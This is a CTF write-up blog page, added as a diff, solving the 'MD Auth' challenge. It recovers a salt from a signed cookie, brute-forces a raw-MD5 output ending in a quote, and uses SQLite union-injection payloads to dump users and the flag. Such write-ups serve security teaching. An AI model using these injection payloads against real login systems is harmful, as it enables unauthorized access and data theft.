@@ -1,0 +1,291 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>SIGSEGV1 Writeup - MD Auth | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="SIGSEGV1 Writeup - MD Auth" />
+  <meta name="description" content="Let&apos;s talk about the &quot;MD Auth&quot; challenge, I admit I started with this challenge thinking it would be about &quot;Markdown&quot;. I was wrong but it was nonetheless interesting to solve" />
+  <meta property="og:description" content="Let&apos;s talk about the &quot;MD Auth&quot; challenge, I admit I started with this challenge thinking it would be about &quot;Markdown&quot;. I was wrong but it was nonetheless interesting to solve" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/sigsegv-md-auth/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/sigsegv-md-auth/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2018-12-23T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/sigsegv1.png" />
+  <meta property="og:image:alt" content="SIGSEGV1 Writeup - MD Auth" />
+  <meta property="og:image:width" content="640" />
+  <meta property="og:image:height" content="300" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">SIGSEGV1 Writeup - MD Auth</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2018-12-23T00:00:00+00:00">2018-12-23</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H2M0S">2&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/sigsegv1.png"
+      alt="SIGSEGV1 Writeup - MD Auth"
+      width="640"
+      height="300"
+    />
+  </figure>
+  <!-- TOC -->
+
+  <!-- Content -->
+  <section><p>Let's talk about the "MD Auth" challenge, I admit I started with this challenge thinking it would be about "Markdown". I was wrong but it was nonetheless interesting to solve.</p>
+<span id="continue-reading"></span>
+<p>The source code of the index was available by requesting : <a href="http://finale-docker.rtfm.re:4444/?source">http://finale-docker.rtfm.re:4444/?source</a></p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>$</span><span style="color:#bf616a;">_TITLE </span><span>= &#39;</span><span style="color:#a3be8c;">MD Auth</span><span>&#39;;
+</span><span>$</span><span style="color:#bf616a;">_LONGTITLE </span><span>= &#39;</span><span style="color:#a3be8c;">MD Auth</span><span>&#39;;
+</span><span>$</span><span style="color:#bf616a;">con </span><span>= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">SQLite3</span><span>(&#39;</span><span style="color:#a3be8c;">mdauth.db</span><span>&#39;);
+</span><span>
+</span><span style="color:#b48ead;">require </span><span>&#39;</span><span style="color:#a3be8c;">config.php</span><span>&#39;; </span><span style="color:#65737e;"># 7-digit APP_SALT, MAX_ERRORS and check_errors()
+</span><span style="color:#b48ead;">if</span><span>(</span><span style="color:#96b5b4;">isset</span><span>($</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;], $</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;])) {
+</span><span>    $</span><span style="color:#bf616a;">errors </span><span>= </span><span style="color:#96b5b4;">isset</span><span>($</span><span style="color:#bf616a;">_COOKIE</span><span>[&#39;</span><span style="color:#a3be8c;">signed_errors</span><span>&#39;]) ? </span><span style="color:#bf616a;">check_errors</span><span>($</span><span style="color:#bf616a;">_COOKIE</span><span>[&#39;</span><span style="color:#a3be8c;">signed_errors</span><span>&#39;]) : </span><span style="color:#d08770;">0</span><span>;
+</span><span>    </span><span style="color:#b48ead;">if</span><span>($</span><span style="color:#bf616a;">errors </span><span>&gt;= </span><span style="color:#d08770;">MAX_ERRORS</span><span>) {
+</span><span>        </span><span style="color:#bf616a;">presult</span><span>(&#39;</span><span style="color:#a3be8c;">You have been banned for reaching </span><span>&#39;.</span><span style="color:#d08770;">MAX_ERRORS</span><span>.&#39; </span><span style="color:#a3be8c;">errors</span><span>&#39;);
+</span><span>    } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>        $</span><span style="color:#bf616a;">login </span><span>= $</span><span style="color:#bf616a;">con</span><span>-&gt;</span><span style="color:#bf616a;">escapeString</span><span>($</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;]);
+</span><span>        $</span><span style="color:#bf616a;">hash </span><span>= </span><span style="color:#96b5b4;">md5</span><span>($</span><span style="color:#bf616a;">con</span><span>-&gt;</span><span style="color:#bf616a;">escapeString</span><span>(</span><span style="color:#d08770;">APP_SALT</span><span>.$</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;]), </span><span style="color:#d08770;">true</span><span>);
+</span><span>        $</span><span style="color:#bf616a;">query </span><span>= $</span><span style="color:#bf616a;">con</span><span>-&gt;</span><span style="color:#bf616a;">query</span><span>(&quot;</span><span style="color:#b48ead;">SELECT</span><span style="color:#a3be8c;"> login </span><span style="color:#b48ead;">FROM</span><span style="color:#a3be8c;"> users </span><span style="color:#b48ead;">WHERE</span><span style="color:#a3be8c;"> hash</span><span>=&#39;</span><span style="color:#a3be8c;">{</span><span>$</span><span style="color:#bf616a;">hash</span><span style="color:#a3be8c;">}</span><span>&#39; and</span><span style="color:#a3be8c;"> login</span><span>=&#39;</span><span style="color:#a3be8c;">{</span><span>$</span><span style="color:#bf616a;">login</span><span style="color:#a3be8c;">}</span><span>&#39;&quot;);
+</span><span>        </span><span style="color:#b48ead;">if</span><span>(!$</span><span style="color:#bf616a;">query</span><span>) $</span><span style="color:#bf616a;">row</span><span>=</span><span style="color:#d08770;">FALSE</span><span>; 
+</span><span>        </span><span style="color:#b48ead;">else </span><span>$</span><span style="color:#bf616a;">row </span><span>= $</span><span style="color:#bf616a;">query</span><span>-&gt;</span><span style="color:#bf616a;">fetchArray</span><span>();
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">if</span><span>($</span><span style="color:#bf616a;">row </span><span>!== </span><span style="color:#d08770;">FALSE</span><span>&amp;&amp; $</span><span style="color:#bf616a;">query</span><span>-&gt;</span><span style="color:#bf616a;">fetchArray</span><span>() === </span><span style="color:#d08770;">FALSE</span><span>) {
+</span><span>            </span><span style="color:#bf616a;">presult</span><span>(&quot;</span><span style="color:#a3be8c;">Welcome back {</span><span>$</span><span style="color:#bf616a;">row</span><span style="color:#a3be8c;">[</span><span>&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;</span><span style="color:#a3be8c;">]}!</span><span>&quot;);
+</span><span>        } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>            </span><span style="color:#bf616a;">presult</span><span>(&#39;</span><span style="color:#a3be8c;">Wrong username/password combination!</span><span>&#39;);
+</span><span>            </span><span style="color:#96b5b4;">setcookie</span><span>(&#39;</span><span style="color:#a3be8c;">signed_errors</span><span>&#39;, </span><span style="color:#96b5b4;">md5</span><span>(</span><span style="color:#d08770;">APP_SALT</span><span>.((</span><span style="color:#b48ead;">string</span><span>) ($</span><span style="color:#bf616a;">errors</span><span>+</span><span style="color:#d08770;">1</span><span>))), </span><span style="color:#96b5b4;">time</span><span>()+</span><span style="color:#d08770;">86400</span><span>);
+</span><span>        }
+</span><span>    }
+</span></code></pre>
+<p>At first I tried to access the database with my browser by requesting <a href="https://swisskyrepo.github.io/blog/sigsegv-md-auth/finale-docker.rtfm.re:4444/mdauth.db">finale-docker.rtfm.re:4444/mdauth.db</a>, unfortunately that didn't work. Let's dig deeper into the source code. We want to authenticate on the Web Application, maybe we can do an SQL injection inside the following query.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span style="color:#b48ead;">SELECT</span><span> login </span><span style="color:#b48ead;">FROM</span><span> users </span><span style="color:#b48ead;">WHERE</span><span> hash=&#39;</span><span style="color:#a3be8c;">{$hash}</span><span>&#39; and login=&#39;</span><span style="color:#a3be8c;">{$login}</span><span>&#39;
+</span></code></pre>
+<p>In order to exploit this, we need to bypass the <code>escapeString</code> function used for <code>$login</code> and <code>$hash</code>.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span>$</span><span style="color:#bf616a;">login </span><span>= $</span><span style="color:#bf616a;">con</span><span>-&gt;</span><span style="color:#bf616a;">escapeString</span><span>($</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;]);
+</span><span>$</span><span style="color:#bf616a;">hash </span><span>= </span><span style="color:#96b5b4;">md5</span><span>($</span><span style="color:#bf616a;">con</span><span>-&gt;</span><span style="color:#bf616a;">escapeString</span><span>(</span><span style="color:#d08770;">APP_SALT</span><span>.$</span><span style="color:#bf616a;">_POST</span><span>[&#39;</span><span style="color:#a3be8c;">password</span><span>&#39;]), </span><span style="color:#d08770;">true</span><span>);
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>The <code>md5</code> function is called with the second argument set to <code>true</code>, meaning we will get a binary output instead of a hexadecimal one. We might be able to get a backslash in the binary output, but we need to know the <code>APP_SALT</code> value in order to do our offline bruteforce. The author of the challenge was kind enough to provide a way to get this secret by misusing the <code>cookie</code>.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span style="color:#96b5b4;">setcookie</span><span>(&#39;</span><span style="color:#a3be8c;">signed_errors</span><span>&#39;, </span><span style="color:#96b5b4;">md5</span><span>(</span><span style="color:#d08770;">APP_SALT</span><span>.((</span><span style="color:#b48ead;">string</span><span>) ($</span><span style="color:#bf616a;">errors</span><span>+</span><span style="color:#d08770;">1</span><span>))), </span><span style="color:#96b5b4;">time</span><span>()+</span><span style="color:#d08770;">86400</span><span>);
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>We can do a single failed attempt in order to get a cookie containing the md5(SALT+"1"), based on the comment in the code we know the SALT is between 0000000-9999999 (7-digit APP_SALT).</p>
+<p>I got <code>MD5:4322dfb1e9b20645594e9f3f6998845a</code> which correspond to the following <code>PLAIN:86203711</code>. We now have our APP_SALT value : 8620371. The following script will bruteforce the first 1000 numbers looking for a quote in the last char of the MD5 output.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>requests
+</span><span style="color:#b48ead;">import </span><span>hashlib
+</span><span>
+</span><span style="color:#65737e;"># md5 true : http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">computeMD5hash</span><span>(</span><span style="color:#bf616a;">my_string</span><span>):
+</span><span>    m = hashlib.</span><span style="color:#bf616a;">md5</span><span>()
+</span><span>    m.</span><span style="color:#bf616a;">update</span><span>(my_string.</span><span style="color:#bf616a;">encode</span><span>(&#39;</span><span style="color:#a3be8c;">utf-8</span><span>&#39;))
+</span><span>    </span><span style="color:#b48ead;">return </span><span>m.</span><span style="color:#bf616a;">digest</span><span>()
+</span><span>
+</span><span style="color:#65737e;"># Use the salt to find a string ending by &quot;\&quot;
+</span><span>salt = &quot;</span><span style="color:#a3be8c;">8620371</span><span>&quot;
+</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">1000</span><span>):
+</span><span>    md5 = </span><span style="color:#bf616a;">computeMD5hash</span><span>(salt+</span><span style="color:#bf616a;">str</span><span>(i))
+</span><span>    </span><span style="color:#b48ead;">if </span><span>&quot;</span><span style="color:#96b5b4;">\\</span><span>&quot; == md5[-</span><span style="color:#d08770;">1</span><span>]:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(salt+</span><span style="color:#bf616a;">str</span><span>(i), i,  md5)
+</span></code></pre>
+<p>In my first attempt, I was looking for a backslash "" in order to escape the single quote "'" from the query and use the login to complete the SQL injection.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span style="color:#b48ead;">SELECT</span><span> login </span><span style="color:#b48ead;">FROM</span><span> users </span><span style="color:#b48ead;">WHERE</span><span> hash=&#39;</span><span style="color:#a3be8c;">{$hash}</span><span>&#39; and login=&#39;</span><span style="color:#a3be8c;">{$login}</span><span>&#39;
+</span><span style="color:#b48ead;">SELECT</span><span> login </span><span style="color:#b48ead;">FROM</span><span> users </span><span style="color:#b48ead;">WHERE</span><span> hash=&#39;</span><span style="color:#a3be8c;">GARBAGE</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;"> and login=</span><span>&#39; OR </span><span style="color:#d08770;">1</span><span>=</span><span style="color:#d08770;">1</span><span style="color:#65737e;">--&#39; 
+</span></code></pre>
+<p>It would have worked in a MySQL database, unfortunately we were in front of a SQLite one. The documentation and stackoverflow provided the useful information, escaping is done by doubling the quote.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span style="color:#b48ead;">INSERT INTO</span><span> table_name (field1, field2) </span><span style="color:#b48ead;">VALUES</span><span> (</span><span style="color:#d08770;">123</span><span>, &#39;</span><span style="color:#a3be8c;">Hello there</span><span style="color:#96b5b4;">&#39;&#39;</span><span style="color:#a3be8c;">s</span><span>&#39;);
+</span></code></pre>
+<p>I adjusted the script to check for a single quote and got the number <code>45</code>.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>salt = &quot;</span><span style="color:#a3be8c;">8620371</span><span>&quot;
+</span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">1000</span><span>):
+</span><span>    md5 = </span><span style="color:#bf616a;">computeMD5hash</span><span>(salt+</span><span style="color:#bf616a;">str</span><span>(i))
+</span><span>    </span><span style="color:#b48ead;">if </span><span>&quot;</span><span style="color:#a3be8c;">&#39;</span><span>&quot; == md5[-</span><span style="color:#d08770;">1</span><span>]:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(salt+</span><span style="color:#bf616a;">str</span><span>(i), i,  md5)
+</span></code></pre>
+<p>Now it's just a simple SQL injection, by using the following credential i was able to extract interesting data.</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>login = &quot;</span><span style="color:#a3be8c;">union all select hash from users limit 1--</span><span>&quot;
+</span><span>password = &quot;</span><span style="color:#a3be8c;">45</span><span>&quot;
+</span><span>
+</span><span>The query looked like &quot;</span><span style="color:#a3be8c;">SELECT login FROM users WHERE hash=&#39;GARBAGE&#39;&#39; and login=&#39; union all select hash from users limit 1--&#39;</span><span>&quot;
+</span><span style="color:#b48ead;">with</span><span> hash=&#39;</span><span style="color:#a3be8c;">GARBAGE</span><span style="color:#96b5b4;">&#39;&#39;</span><span style="color:#a3be8c;"> and login=</span><span>&#39;
+</span></code></pre>
+<p>I got the following users : <code>admin</code> and <code>flaggy</code>. Next step was to extract the flag from the database, it was located in the flag_field of the users.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">union</span><span> all select flag_field from users limit 2,1--
+</span><span style="color:#bf616a;">Welcome</span><span> back sigsegv{82e9f4a155b9b740b4ff37624429b031}!
+</span></code></pre>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/seamonsterctf/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>UYBHYS - Sea Monster Attack &amp; Defense CTF</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/an-xss-story/" accesskey="."
+    ><span>An XSS Story</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
